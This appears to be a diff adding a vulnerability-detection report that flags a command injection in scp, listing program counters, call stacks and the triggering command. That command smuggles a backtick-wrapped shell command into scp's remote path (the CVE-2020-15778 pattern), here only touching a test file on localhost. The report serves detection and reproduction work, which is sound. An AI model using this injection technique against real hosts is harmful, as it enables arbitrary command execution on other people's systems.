@@ -1,0 +1,9 @@
+Command Injection Vulnerability Detected
+
+Writing malicious commands:
+  pc: 0x55555555a2ce
+  callstack: 0x5555555826e2 --> 0x555555599042 --> 0x7ffff753ab97 --> 0x555555558539 
+Malicious command execution:
+  pc: 0x55555555a2f4
+  callstack: 0x5555555826e2 --> 0x555555599042 --> 0x7ffff753ab97 --> 0x555555558539
+  command: ./scp -P 7788 ./test root@127.0.0.1:'`touch /home/trace/CVE/CVE-2020-15778/test33`/home/trace/CVE/CVE-2020-15778/test3'
